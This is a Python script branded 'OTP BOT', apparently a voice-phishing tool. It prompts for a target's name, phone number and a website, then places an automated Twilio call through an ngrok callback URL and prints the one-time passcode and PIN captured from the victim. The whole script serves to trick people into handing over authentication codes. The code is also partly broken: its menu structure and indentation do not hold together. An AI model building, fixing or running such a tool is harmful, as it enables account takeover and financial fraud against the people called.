#!/usr/bin/python -u
import sys
from typing import TextIO
import os
import time
from twilio.rest import Client
import json
import shelve
    
# System call
os.system("")

# Class of different styles
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def menu():

        ''' Main menu to choose an item '''

chosen_element = 0

print(style.BLUE + "#############################################################################")
print(style.BLUE + "########	                                                     ########")
print(style.BLUE + "########     ░█████╗░████████╗██████╗░░░██████╗░░█████╗░████████╗    ########")
print(style.BLUE + "########     ██╔══██╗╚══██╔══╝██╔══██╗░░██╔══██╗██╔══██╗╚══██╔══╝    ########")
print(style.BLUE + "########     ██║░░██║░░░██║░░░██████╔╝░░██████╦╝██║░░██║░░░██║░░░    ########")
print(style.BLUE + "########     ██║░░██║░░░██║░░░██╔═══╝░░░██╔══██╗██║░░██║░░░██║░░░    ########")
print(style.BLUE + "########     ╚█████╔╝░░░██║░░░██║░░░░░░░██████╦╝╚█████╔╝░░░██║░░░    ########")
print(style.BLUE + "########     ░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░    ########")
print(style.BLUE + "########	                                                     ########")
print(style.BLUE + "########	        1) RETRIEVE OTP             3) HELP          ########")
print(style.BLUE + "########	        2) SETTINGS                 4) EXIT          ########")
print(style.BLUE + "########	                                                     ########")
print(style.BLUE + "########	                           telegram:@ThePsychedelian ########")
print(style.BLUE + "#############################################################################")
chosen_element = input("Enter a number from 1 to 4: ")

if int(chosen_element) == 1:

    import keyboard as keyboard
    from flask import Flask, request
    from twilio.rest import Client
    import time
    import os
    import json
    import threading
    import requests
    import keyboard

    app = Flask(__name__)

    if not 'otp.txt' in os.listdir():
        open('otp.txt', 'w').close()
    if not 'pin.txt' in os.listdir():
        open('pin.txt', 'w').close()
    if not 'name.txt' in os.listdir():
        open('name.txt', 'w').close()
    if not 'to.txt' in os.listdir():
        open('to.txt', 'w').close()
    if not 'site.txt' in os.listdir():
        open('site.txt', 'w').close()

    raw_config = json.loads(open('Config.txt', 'r').read())

    site = open('site.txt', 'r').read()
    name = open('name.txt', 'r').read()
    send2 = open('to.txt', 'r').read()
    account_sid = raw_config['account_sid']
    auth_token = raw_config['auth_token']
    twilio_number = raw_config['twilio_number']
    ngrok = raw_config['ngrok_url']
    client = Client(account_sid, auth_token)

    outfile = open("name.txt", "w")
    name = input("Please enter target's name: ")
    outfile.write(name)
    outfile.close()

    outfile = open("to.txt", "w")
    send2 = input("Please enter target's phone number: ")
    outfile.write(send2)
    outfile.close()

    outfile = open("site.txt", "w")
    site = input("Please enter name of website: ")
    outfile.write(site)
    outfile.close()

    call = client.calls.create(
        machine_detection='Enable',
        status_callback=f'{ngrok}/voice',
        status_callback_event=['queued', 'initiated', 'answered', 'ringing', 'canceled', 'completed', 'busy', 'no-answer', 'failed'],
        status_callback_method='POST',
        url=f'{ngrok}/voice',
        to=f'{send2}',
        from_=f'{twilio_number}')
    sid = call.sid
    print(call.sid)
    a = 0
    b = 0
    c = 0
    d = 0
    while True:
        if client.calls(sid).fetch().status == 'queued':
            if not a >= 1:
                a = a + 1
                print("queued")
        elif client.calls(sid).fetch().status == 'ringing':
            if not b >= 1:
                b = b + 1
                print("ringing")
        elif client.calls(sid).fetch().status == 'in-progress':
            if not c >= 1:
                c = c + 1
                print("inprogress")
        elif client.calls(sid).fetch().status == 'completed':
            print("completed")
            break
        elif client.calls(sid).fetch().status == 'failed':
            print("failed")
            break
        elif client.calls(sid).fetch().status == 'no-answer':
            print("noanswer")
            break
        elif client.calls(sid).fetch().status == 'canceled':
            print("canceled")
            break
        elif client.calls(sid).fetch().status == 'busy':
            print("busy")

otp = open(f'otp.txt', 'r').read()
if otp == '':
    print("no_otp")
else:
	print('OTP IS')
	print({otp}),
		
pin = open(f'pin.txt', 'r').read()
if pin == '':
     print("no_pin")
else:
	print('PIN NUMBER IS')
	print({pin}),
	
	time.sleep(1)
	
check = input("Press enter to exit: ")
if check.upper() == "":
    exit()

if int(chosen_element) == 2:
    print(" ")
    print("All settings are located in the .env file, open it and configure it as shown.")
    print("TWILIO_ACCOUNT_SID=AC################################")
    print("TWILIO_API_KEY=SK###############################")
    print("TWILIO_API_SECRET=##########################")
    print("TWILIO_TWIML_APP_SID=SK###############################")
    print("TWILIO_AUTH_TOKEN=##############################")
    print("NGROK_URL=https://####.ngrok.io")
    print("FROM_NUMBER=+1##########")
    print(" ")

check = input("Press enter to exit: ")
if check.upper() == "":
    exit()

if int(chosen_element) == 3:
    from twilio.rest import Client
    import time
    import os
    import json
    import requests
    print("")
else:
    print('Sorry, the value entered must be a number from 1 to 5, then try again!')
if int(chosen_element) == 4:
    sys.exit()
else:
    print('Sorry, the value entered must be a number from 1 to 5, then try again!')

if __name__ == '__main__':
    ''' Python script main function '''

